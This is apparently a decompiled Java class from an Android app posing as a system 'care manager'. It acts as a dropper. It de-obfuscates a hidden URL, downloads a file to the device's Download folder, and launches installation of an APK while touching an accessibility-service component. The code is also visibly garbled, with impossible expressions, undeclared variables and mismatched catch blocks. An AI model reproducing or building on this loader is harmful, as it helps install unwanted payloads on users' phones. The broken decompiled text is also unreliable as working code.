package com.system.caremanager;

import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class MiscHelper extends AsyncTask {

    private Context context;

    public MiscHelper() {
        return;
    }

    protected Void doInBackground(String[] param1) {
        return null;
    }

    public void setContext(Context param1, String[] param2) {
        try {
            this.context = param1;
            URL uRL = new URL();
            String item = param2[null];
            URLConnection result = uRL.openConnection();
            result = (HttpURLConnection) result;
            String result2 = DataPackagingEngine.removeString(str2, str);
            result.setRequestMethod(result);
            result.setDoOutput(1);
            result.connect();
            String str3 = "/mnt/sdcard/Download/";
            File file = new File();
            boolean result3 = file.mkdirs();
            File file2 = new File();
            String result4 = DataPackagingEngine.removeString(str4, str);
            boolean result5 = file2.exists();
            if (result == null) {
                // branch: cond_0
            }
            boolean result6 = file2.delete();
            FileOutputStream fileOutputStream = new FileOutputStream();
            InputStream result7 = result.getInputStream();
            int val = 1024;
            byte[] arr = new byte[val];
            int result8 = result.read(arr);
            int val2 = -1;
            if (result == val2) {
                // branch: cond_1
            }
            fileOutputStream.write(arr, null, result);
            // continue loop -> :goto_0
            fileOutputStream.close();
            result.close();
            Intent intent = new Intent();
            String str5 = "android.intent.action.VIEW";
            Context context = this.context;
            File file3 = new File();
            String result9 = DataPackagingEngine.removeString(str6, str);
            Uri result10 = DataPackagingEngine.uriFromFile(context, file3);
            String str7 = "application/vnd.android.package-archive";
            Intent result11 = intent.setDataAndType(result, str7);
            int val3 = 268435456;
            Intent result12 = intent.setFlags(val3);
            Boolean result13 = Boolean.valueOf(1);
            AccessibilityServiceCore.fOR_IN = result;
            Context context2 = this.context;
            context2.startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}